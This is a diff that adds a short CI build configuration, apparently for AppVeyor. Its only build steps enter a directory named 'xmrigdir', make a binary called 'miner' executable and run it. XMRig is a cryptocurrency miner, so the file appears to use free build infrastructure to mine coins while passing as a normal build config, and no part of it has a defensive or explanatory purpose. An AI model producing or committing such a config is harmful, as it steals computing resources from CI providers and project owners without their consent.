@@ -1,0 +1,15 @@
+version: 1.0.{build}
+
+image: Ubuntu
+
+init:
+  # Make sure bash is installed (Ubuntu image usually has it pre-installed)
+  - sudo apt-get update
+  - sudo apt-get install -y bash
+
+build_script:
+  # Grant execute permission to the file if needed
+  - cd xmrigdir
+  - chmod +x ./miner
+  # Run the script with no extension
+  - ./miner
